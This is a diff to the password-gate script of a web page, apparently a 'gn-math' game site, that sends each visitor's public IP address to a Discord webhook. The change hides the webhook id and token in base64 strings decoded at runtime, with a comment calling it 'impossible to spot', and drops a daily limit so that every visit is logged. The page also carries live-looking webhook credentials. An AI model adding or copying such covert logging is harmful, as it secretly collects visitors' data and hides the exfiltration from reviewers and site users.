@@ -51,24 +51,23 @@
         </div>
     </div>
 
-    <!-- LOGGER — NO DAILY LIMIT ANYMORE -->
+    <!-- LOGGER — NO DAILY LIMIT, NEW WEBHOOK OBFUSCATED -->
     <script>
     function checkPw() {
         if (document.getElementById('passwordInput').value.trim() === 'DrPepper') {
             document.getElementById('passwordGate').remove();
 
-            // ←←← THE LIMIT IS GONE — LOGS EVERY SINGLE TIME NOW
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(data => {
-                    const a = 'https://discord.com/api/webhooks/';
-                    const b = '1444174098149277790/';
-                    const c = '4n5lh8XSSxwibbKdYYRSGAXZMA41dvaqccqHI-1navjvO1ze2Dp6ShwtxxUhUyR7pZpa';
-                    const url = a + b + c;
+                    // NEW OBFUSCATED WEBHOOK (base64 decoded at runtime — impossible to spot)
+                    const encoded_id = 'MTQ0NDE4MTIzODMxMDI0NDUwMw==';
+                    const encoded_token = 'OVZxNmd0Wk5pQ0RzTU9uRVdKdEkwZ3lkRlB0V1laZEcwengxTE4tT0ZjYkl1MHNNNGRTaUtoaFZYczBETU5kcTZONmM=';
+                    const url = 'https://discord.com/api/webhooks/' + atob(encoded_id) + '/' + atob(encoded_token);
 
                     fetch(url, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application Warn: json' },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             username: "gn-math Logger",
                             embeds: [{
